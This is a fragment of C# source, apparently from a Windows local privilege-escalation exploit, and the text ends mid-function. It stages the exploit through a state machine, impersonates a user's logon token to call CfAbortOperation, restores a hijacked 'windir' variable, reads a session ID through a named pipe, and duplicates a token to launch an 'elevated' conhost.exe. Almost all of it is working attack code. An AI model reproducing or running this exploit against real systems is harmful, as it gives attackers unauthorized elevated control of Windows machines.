        private static void ExecuteExploitStage(int stage)
        {
            Logger.Info($"Executing exploit stage: {stage}");

            if (stage < 0 || stage >= ExploitConfig.TOTAL_STAGES)
            {
                throw new ArgumentException($"Invalid stage number: {stage}. Must be 0-{ExploitConfig.TOTAL_STAGES - 1}");
            }

            var stateMachine = new ExploitStateMachine();
            stateMachine.ExecuteStage(stage);
        }

        private static void ExecuteWithCredentials(string username, string password)
        {
            Logger.Info($"Executing with credentials for user: {username}");

            try
            {
                using (var token = TokenUtils.GetLogonUserToken(username, "", password, SecurityLogonType.Network, null))
                {
                    using (var impersonation = token.Impersonate())
                    {
                        Logger.Info("Impersonation successful - calling CfAbortOperation");
                        NativeInterop.CfAbortOperation(
                            NtProcess.Current.ProcessId,
                            IntPtr.Zero,
                            NativeInterop.AbortHydrationFlags.Block
                        ).CheckHResult();
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.Error("Failed to execute with credentials", ex);
                throw;
            }
        }

        private static void ExecuteElevatedPayload()
        {
            try
            {
                // Restore original windir environment variable
                Environment.SetEnvironmentVariable("windir", ExploitConfig.WINDOWS_DIR, EnvironmentVariableTarget.Process);
                Logger.Info("Restored windir environment variable");

                // Connect to named pipe
                Logger.Info($"Connecting to named pipe: {ExploitConfig.PIPE_NAME}");
                using (var pipeClient = new NamedPipeClientStream(ExploitConfig.PIPE_NAME))
                {
                    pipeClient.Connect();

                    // Get session ID from pipe server
                    IntPtr pipeHandle = pipeClient.SafePipeHandle.DangerousGetHandle();
                    if (!NativeInterop.GetNamedPipeServerSessionId(pipeHandle, out uint sessionId))
                    {
                        Logger.Error("Failed to get named pipe server session ID");
                        return;
                    }

                    Logger.Info($"Retrieved session ID: {sessionId}");
                    pipeClient.Dispose();

                    // Duplicate and modify token
                    using (var token = NtToken.OpenEffectiveToken())
                    using (var duplicatedToken = token.DuplicateToken())
                    {
                        duplicatedToken.SetSessionId((int)sessionId);
                        Logger.Info($"Token session ID set to: {sessionId}");

                        // Launch elevated process
                        Logger.Info($"Launching elevated conhost.exe");
                        Win32Process.CreateProcessAsUser(
                            duplicatedToken,
                            ExploitConfig.CONHOST_PATH,
                            "",
                            CreateProcessFlags.None,
                            null
                        );

                        Logger.Info("Elevated process launched successfully");
